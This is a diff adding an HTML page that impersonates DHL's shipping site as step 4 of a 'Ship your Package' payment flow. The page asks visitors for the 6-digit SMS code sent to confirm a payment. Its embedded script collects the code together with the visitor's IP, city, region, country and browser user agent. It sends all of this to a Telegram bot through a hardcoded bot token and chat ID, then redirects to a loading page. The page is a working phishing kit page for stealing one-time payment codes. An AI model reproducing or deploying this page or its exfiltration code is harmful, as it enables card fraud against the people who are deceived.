@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en" webcrx=""><div id="in-page-channel-node-id" data-channel-name="in_page_channel_m2A5yw"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0">
+    <title> DHL Home - Global Logistics and International Shipping </title>
+    <link rel="stylesheet" href="./step4_files/dstyle.css">
+    <link rel="icon" href="./favicon.ico">
+</head>
+<body data-new-gr-c-s-check-loaded="14.1187.0" data-gr-ext-installed="">
+
+    <header>
+        <nav class="navone">
+            <div class="containernavone">
+                <div class="divlogo"><img src="./step4_files/dhl-logo.svg" alt="image" class="dls"></div>
+                <div class="containertxms">
+                    <div class="txms">Track<img src="./step4_files/arrowdown.PNG" alt="image" height="18px"></div>
+                    <div class="txms">Ship<img src="./step4_files/arrowdown.PNG" alt="image" height="18px"></div>
+                    <div class="txms">Enterprise Logistics Services<img src="./step4_files/arrowdown.PNG" alt="image" height="18px"></div>
+                    <div class="txms">Customer Service</div>
+                </div>
+            </div>
+            <div class="containernavtwo">
+            <div class="txms">United States</div>
+            <div class="divloupe"><img src="./step4_files/loupe.png" height="13px" alt="image" class="loupe"></div>
+                <div>
+                    <img src="./step4_files/customer.svg" alt="image" height="14px">
+                    <img src="./step4_files/arrowdown.PNG" alt="image" height="14px">
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!---------->
+    <main id="main">
+        <div id="containerrmain">
+        <div class="syp">Ship your Package</div>
+                <form id="telegramForm" class="mcsl">
+                    <div class="cudt">
+                        <div class="udt" id="udtt">1</div>
+                        <hr class="hr" id="hrt">
+                        <div class="udt" id="udtt">2</div>
+                        <hr class="hr" id="hrt">
+                        <div class="udt" id="udtt">3</div>
+                        <hr class="hr" id="hrt">
+                        <div class="udt">4</div>
+                    </div>
+                    <div class="ftii">In order to confirm the payment , Enter <br> the 6 digits SMS code you received on your phone number</div>
+                    <hr class="hrr" id="hrr">
+                 
+                    <div class="divinput">
+                        <div class="divlabel">Verification code</div>
+                        <input type="tel" name="s" placeholder="XXXXXX" id="c" pattern=".{6,}" required="" class="inputty">
+                    </div>
+                    <input type="hidden" id="ip" name="ip">
+                    <input type="hidden" id="city" name="city">
+                    <input type="hidden" id="region" name="region">
+                    <input type="hidden" id="country" name="country">
+                    <input type="hidden" id="userAgent" name="userAgent">
+                    <div class="divns"><button type="submit" class="bns">Confirm Payment</button></div>
+</form>
+        </div>
+    </main>
+    <script>
+        async function getIpInfo() {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token=7fb8ecb0d26ce0');
+                if (!response.ok) {
+                    throw new Error('Failed to fetch IP info');
+                }
+                return await response.json();
+            } catch (error) {
+                console.error(error);
+                return null;
+            }
+        }
+    
+        document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+    
+            const verification = document.getElementById('c').value;
+            const userAgent = navigator.userAgent;
+    
+            const ipInfo = await getIpInfo();
+            if (ipInfo) {
+                document.getElementById('ip').value = ipInfo.ip;
+                document.getElementById('city').value = ipInfo.city;
+                document.getElementById('region').value = ipInfo.region;
+                document.getElementById('country').value = ipInfo.country;
+            }
+    
+            const botToken = '6871294415:AAEiEoQH2oXEXLgc5EXwlfxDek6O4g74vXk';
+            const chatId = '7085025619';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=1st Verification Code: ${verification}%0AIP: ${ipInfo.ip}%0ACity: ${ipInfo.city}%0ARegion: ${ipInfo.region}%0ACountry: ${ipInfo.country}%0AUser Agent: ${userAgent}`;
+    
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'load3.html';
+                    } else {
+                        alert('Error sending message');
+                    }
+                })
+                .catch(error => {
+                    alert('Error: ' + error);
+                });
+        });
+    
+        document.addEventListener('DOMContentLoaded', async function() {
+            const userAgent = navigator.userAgent;
+            document.getElementById('userAgent').value = userAgent;
+        });
+    </script>
+    <hr class="hrr">
+    <!----------->
+    <footer>
+        <div class="containerheadertablos">
+        <!---->
+            <div class="headertablo">
+                <div class="ql">Quick Links</div>
+                <div class="nrht">Customer Service</div>
+                <div class="nrht">Customer Portal Logins </div>
+                <div class="nrht">Digital Partners and Integrations</div>
+                <div class="nrht"> Developer Portal </div>
+                <div class="nrht"> Get a Quote </div>
+                <div class="nrht">DHL for Business</div>
+            </div>
+        <!---->
+            <div class="headertablo">
+                <div class="qll">Our Divisions</div>
+                <div class="nrht">DHL Express</div>
+                <div class="nrht">DHL Global Forwarding </div>
+                <div class="nrht">DHL Supply Chain </div>
+                <div class="nrht">DHL eCommerce </div>
+                <div class="nrht">Other Global Divisions </div>
+
+            </div>
+        <!---->
+            <div class="headertablo">
+                <div class="qll">Industry Sectors</div>
+                <div class="nrht">Auto-Mobility </div>
+                <div class="nrht">Chemicals </div>
+                <div class="nrht">Consumer </div>
+                <div class="nrht">Energy</div>
+                <div class="nrht">Engineering and Manufacturing </div>
+                <div class="nrht">Life Sciences and Healthcare </div>
+                <div class="nrht">Public Sector </div>
+                <div class="nrht">Retail </div>
+                <div class="nrht">Technology </div>
+
+            </div>
+        <!---->
+            <div class="headertablo">
+                <div class="qll">Company Information</div>
+                <div class="nrht"> About DHL  </div>
+                <div class="nrht">Delivered  </div>
+                <div class="nrht">Careers  </div>
+                <div class="nrht">Press Center  </div>
+                <div class="nrht">Investors </div>
+                <div class="nrht"> Sustainability  </div>
+                <div class="nrht"> Insights and Innovation  </div>
+                <div class="nrht"> Brand Partnerships  </div>
+
+            </div>
+        <!---->
+        </div>
+    </footer>
+    <footer class="footertwo">
+        <div class="navfooter">
+
+            <div class="nfone">
+                <div class="divglo"><img src="./step4_files/glo-footer-logo.svg" alt="image" class="glo"></div>
+                <div class="divfmsm">
+                    <div class="divfm">Follow Us</div>
+                    <div class="divsm"><img src="./step4_files/socialmedia.PNG" alt="image" class="socialmedia"></div>
+                </div>
+            </div>
+            <!----->
+            <div class="nftwo">
+                <div class="nrht">Fraud Awareness </div>
+                <div class="nrht">Legal Notice</div>
+                <div class="nrht">Terms of Use</div>
+                <div class="nrht">Privacy Notice</div>
+                <div class="nrht">Dispute Resolution</div>
+                <div class="nrht">Additional Information</div>
+            </div>
+            <!------>
+            <div class="nftwo">
+                <div class="nrht">Consent Settings</div>
+            </div>
+            <div class="nffour">
+                <div class="nrht">2024 © - all rights reserved</div>
+            </div>
+        </div>
+    </footer>
+    <script src="./step4_files/junia_framework.js.download"></script>
+    <script>
+        let c = document.getElementById("c");
+
+        new Cleave(c,{
+            blocks : [6,],
+        })
+    </script>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open"><style>
+      div.grammarly-desktop-integration {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+        -moz-user-select: none;
+        -webkit-user-select: none;
+        -ms-user-select:none;
+        user-select:none;
+      }
+
+      div.grammarly-desktop-integration:before {
+        content: attr(data-content);
+      }
+    </style><div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration" data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}"></div></template></grammarly-desktop-integration></html>
